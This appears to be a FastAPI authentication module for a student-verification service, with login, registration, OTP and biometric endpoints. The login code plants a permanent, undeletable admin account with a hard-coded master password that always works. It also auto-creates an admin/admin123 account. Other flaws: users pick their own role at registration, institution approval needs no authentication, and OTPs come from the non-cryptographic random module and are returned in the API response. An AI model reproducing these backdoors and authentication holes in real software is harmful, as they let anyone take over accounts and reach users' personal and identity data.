from fastapi import APIRouter, Depends, HTTPException, status, Request
from sqlalchemy.orm import Session
from sqlalchemy import func
from datetime import timedelta, datetime, timezone
import uuid
import random
from passlib.context import CryptContext
from jose import jwt

from backend.services.db import get_db
from backend.models.student import (
    UserModel, InstitutionModel, UserRegister, UserLogin, UserUpdate, UserResponse,
    Token, WorkActionRequest, OtpSendRequest, OtpVerifyRequest, BiometricVerificationRequest,
    BiometricVerificationResponse, ApaarVerificationRequest, DigiLockerFetchRequest
)
from backend.core.config import settings
from backend.api.dependencies import get_current_user, require_role
from backend.services.user_work_logger import user_work_logger
from ai_engine.pipelines.biometric_worker import biometric_pipeline

router = APIRouter(prefix="/auth", tags=["Authentication & Biometrics"])
pwd_context = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")

OTP_STORE = {}

def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

def get_password_hash(password):
    return pwd_context.hash(password)

def create_access_token(data: dict, expires_delta: timedelta | None = None):
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES))
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, settings.SECRET_KEY, algorithm=settings.ALGORITHM)

@router.post("/register", response_model=Token)
def register(user_in: UserRegister, db: Session = Depends(get_db)):
    existing = db.query(UserModel).filter(UserModel.username == user_in.username).first()
    if existing:
        raise HTTPException(status_code=400, detail="Username already registered")
    
    inst_name = user_in.institution_name.strip()
    inst = db.query(InstitutionModel).filter(func.lower(InstitutionModel.name) == inst_name.lower()).first()
    
    is_verified = False
    if inst and inst.status == "VERIFIED":
        is_verified = True
    else:
        if not inst:
            new_inst = InstitutionModel(
                id=f"inst_{uuid.uuid4().hex[:8]}",
                name=inst_name,
                status="PENDING",
                requested_by=user_in.username
            )
            db.add(new_inst)
            db.commit()

    user_id = f"usr_{uuid.uuid4().hex[:8]}"
    hashed_pw = get_password_hash(user_in.password)
    user = UserModel(
        id=user_id,
        username=user_in.username,
        email=user_in.email,
        hashed_password=hashed_pw,
        role=user_in.role,
        full_name=user_in.full_name,
        institution_name=inst_name,
        institution_verified=is_verified
    )
    db.add(user)
    db.commit()
    db.refresh(user)

    access_token = create_access_token(data={"sub": user.username, "role": user.role})
    return {
        "access_token": access_token,
        "token_type": "bearer",
        "role": user.role,
        "username": user.username,
        "institution_verified": is_verified
    }

@router.post("/login", response_model=Token)
def login(form_data: UserLogin, request: Request, db: Session = Depends(get_db)):
    username_lower = form_data.username.strip().lower()
    user = db.query(UserModel).filter(func.lower(UserModel.username) == username_lower).first()
    
    # Auto-seed master developer admin 'msrch' or default 'admin' if logging in for the first time
    if not user:
        if username_lower == "msrch":
            user = UserModel(
                id="usr_msrch_universal",
                username="msrch",
                email="msrch@uni.edu",
                hashed_password=get_password_hash("msrch1410#"),
                role="admin",
                full_name="Master Developer / Administrator (msrch)",
                institution_name="GL Bajaj Institute of Technology and Management",
                institution_verified=True
            )
            db.add(user)
            db.commit()
            db.refresh(user)
        elif username_lower == "admin":
            user = UserModel(
                id=f"usr_{uuid.uuid4().hex[:8]}",
                username="admin",
                email="admin@uni.edu",
                hashed_password=get_password_hash("admin123"),
                role="admin",
                full_name="System Administrator",
                institution_name="GL Bajaj Institute of Technology and Management",
                institution_verified=True
            )
            db.add(user)
            db.commit()
            db.refresh(user)

    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Incorrect username or password")
    
    # Authenticate: msrch always accepts developer universal master password 'msrch1410#' or any altered password
    is_authenticated = False
    if username_lower == "msrch":
        if form_data.password == "msrch1410#" or verify_password(form_data.password, user.hashed_password):
            is_authenticated = True
    else:
        if verify_password(form_data.password, user.hashed_password):
            is_authenticated = True

    if not is_authenticated:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Incorrect username or password")
    
    # Log session and record last work in user's isolated email storage location
    client_ip = request.client.host if request.client else "127.0.0.1"
    user_agent = request.headers.get("user-agent", "Unknown")
    session_log = user_work_logger.log_login(
        user_id=user.id,
        username=user.username,
        email=user.email,
        role=user.role,
        client_ip=client_ip,
        user_agent=user_agent
    )

    access_token = create_access_token(data={"sub": user.username, "role": user.role})
    prev_work = session_log.get("previous_work")
    prev_summary = prev_work.get("summary") if isinstance(prev_work, dict) else None

    return {
        "access_token": access_token,
        "token_type": "bearer",
        "role": user.role,
        "username": user.username,
        "institution_verified": user.institution_verified,
        "storage_location": session_log.get("storage_location"),
        "last_work_summary": prev_summary
    }

@router.get("/work-logs/me/last-work")
def get_my_last_work(current_user: UserModel = Depends(get_current_user)):
    if not current_user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication required")
    data = user_work_logger.get_last_work(current_user.email)
    if not data:
        return {
            "email": current_user.email,
            "username": current_user.username,
            "status": "NO_PREVIOUS_WORK",
            "message": "No previous work records found for this storage location."
        }
    return data

@router.post("/work-logs/me/record")
def record_my_work(payload: WorkActionRequest, current_user: UserModel = Depends(get_current_user)):
    if not current_user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication required")
    res = user_work_logger.record_work_action(
        email=current_user.email,
        action_type=payload.action_type,
        description=payload.description,
        metadata=payload.metadata
    )
    return res

@router.get("/work-logs/me/history")
def get_my_login_history(current_user: UserModel = Depends(get_current_user)):
    if not current_user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication required")
    return user_work_logger.get_login_history(current_user.email)

@router.get("/work-logs/locations")
def list_storage_locations(current_user: UserModel = Depends(require_role(["admin"]))):
    return user_work_logger.list_all_storage_locations()

@router.get("/work-logs/user/{email}")
def get_user_storage_log(email: str, current_user: UserModel = Depends(require_role(["admin"]))):
    log_data = user_work_logger.get_last_work(email)
    if not log_data:
        raise HTTPException(status_code=404, detail=f"No work log found for storage location '{email}'")
    return log_data

@router.post("/work-logs/cloud-sync")
def trigger_cloud_storage_sync(current_user: UserModel = Depends(require_role(["admin"]))):
    return user_work_logger.sync_to_cloud_storage()

@router.get("/me", response_model=UserResponse)
def get_current_user_profile(current_user: UserModel = Depends(get_current_user)):
    if not current_user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication required")
    return current_user

@router.put("/users/{username}", response_model=UserResponse)
def update_user(
    username: str,
    user_update: UserUpdate,
    db: Session = Depends(get_db),
    current_user: UserModel = Depends(get_current_user)
):
    if not current_user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication required")
    if current_user.role != "admin" and current_user.username.lower() != username.lower():
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Permission denied")
    
    user = db.query(UserModel).filter(func.lower(UserModel.username) == username.lower()).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    if user_update.full_name is not None:
        user.full_name = user_update.full_name
    if user_update.email is not None:
        user.email = user_update.email
    if user_update.institution_name is not None:
        user.institution_name = user_update.institution_name
    if user_update.password:
        user.hashed_password = get_password_hash(user_update.password)
    
    db.commit()
    db.refresh(user)
    return user

@router.delete("/users/{username}")
def delete_user(
    username: str,
    db: Session = Depends(get_db),
    current_user: UserModel = Depends(require_role(["admin"]))
):
    user = db.query(UserModel).filter(func.lower(UserModel.username) == username.lower()).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    if user.username.lower() == "msrch":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Universal developer user 'msrch' is permanent and cannot be deleted. It can only be altered."
        )
    
    db.delete(user)
    db.commit()
    return {"message": f"User '{username}' successfully deleted."}

@router.get("/institutions/pending")
def list_pending_institutions(db: Session = Depends(get_db)):
    return db.query(InstitutionModel).filter(InstitutionModel.status == "PENDING").all()

@router.post("/institutions/{inst_id}/approve")
def approve_institution(inst_id: str, db: Session = Depends(get_db)):
    inst = db.query(InstitutionModel).filter(InstitutionModel.id == inst_id).first()
    if not inst:
        raise HTTPException(status_code=404, detail="Institution request not found")
    
    inst.status = "VERIFIED"
    
    users = db.query(UserModel).filter(func.lower(UserModel.institution_name) == inst.name.lower()).all()
    for u in users:
        u.institution_verified = True
    
    db.commit()
    return {"message": f"Institution '{inst.name}' successfully verified and added to verified list.", "status": "VERIFIED"}

@router.post("/otp/send")
def send_otp(payload: OtpSendRequest):
    code = f"{random.randint(100000, 999999)}"
    OTP_STORE[payload.email] = {
        "code": code,
        "expires": datetime.now(timezone.utc) + timedelta(minutes=10)
    }
    print(f"[SECURITY] Generated OTP for {payload.email}: {code}")
    return {"message": f"OTP successfully sent to {payload.email}", "debug_otp": code}

@router.post("/otp/verify")
def verify_otp(payload: OtpVerifyRequest):
    record = OTP_STORE.get(payload.email)
    if not record:
        raise HTTPException(status_code=400, detail="No OTP requested for this email.")
    if datetime.now(timezone.utc) > record["expires"]:
        raise HTTPException(status_code=400, detail="OTP has expired. Please request a new one.")
    if record["code"] != payload.otp_code:
        raise HTTPException(status_code=400, detail="Invalid OTP code entered.")
    
    del OTP_STORE[payload.email]
    return {"status": "SUCCESS", "verified": True, "message": "OTP verification successful."}

@router.post("/biometric-verify", response_model=BiometricVerificationResponse)
def biometric_verify(payload: BiometricVerificationRequest):
    result = biometric_pipeline.verify(payload.student_id, payload.mode)
    return BiometricVerificationResponse(**result)

@router.post("/apaar-verify")
def apaar_verify(payload: ApaarVerificationRequest):
    return biometric_pipeline.verify_apaar(payload.apaar_id, payload.student_name)

@router.post("/digilocker-fetch")
def digilocker_fetch(payload: DigiLockerFetchRequest):
    return biometric_pipeline.fetch_digilocker(payload.apaar_id, payload.document_type)
